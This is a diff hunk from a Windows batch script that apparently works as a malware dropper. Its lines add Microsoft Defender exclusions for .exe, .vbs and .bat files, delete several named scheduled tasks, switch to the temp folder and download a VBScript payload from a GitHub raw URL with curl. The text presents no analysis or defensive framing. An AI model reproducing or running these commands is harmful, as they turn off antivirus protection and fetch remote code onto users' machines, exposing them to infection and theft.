@@ -7,6 +7,9 @@ powershell -Command Add-MpPreference -ExclusionExtension ".exe"
 powershell -Command Add-MpPreference -ExclusionExtension "exe"
 powershell -Command Add-MpPreference -ExclusionExtension ".vbs"
 powershell -Command Add-MpPreference -ExclusionExtension ".bat"
+schtasks /delete /tn "upgradef1" /f
+schtasks /delete /tn "InstallRequests" /f
+schtasks /delete /tn "RunPowerShellScript" /f
 cd %temp%
 
 curl https://raw.githubusercontent.com/seition2doc/dosta2/refs/heads/main/e.vbs-o e.vbs
